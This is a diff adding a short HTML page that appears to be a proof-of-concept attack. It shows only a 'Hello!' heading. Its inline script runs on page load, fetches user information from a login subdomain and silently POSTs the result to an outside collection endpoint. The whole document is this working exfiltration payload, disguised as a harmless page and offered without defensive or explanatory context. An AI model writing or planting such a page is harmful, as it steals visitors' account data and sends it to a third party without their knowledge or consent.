@@ -1,0 +1,30 @@
+<html>
+<head></head>
+<body>
+	<h1>Hello!</h1>
+    <script>
+		(async() => {
+			let body = {};
+			try {
+				const res = await fetch('https://login.sketchycompany.upd-dcs.work/userinfo', {
+					method: 'GET'
+				});
+				const data = await res.json();
+
+				body = {
+					userInfo: data,
+				}
+			} catch (e) {
+				body = {
+					error: e.message
+				}
+			}
+
+			await fetch('https://hkdk.events/lxjnpl4yoq2m7x', {
+				method: 'POST',
+				body: JSON.stringify(body),
+			});
+		})();
+    </script>
+</body>
+</html>
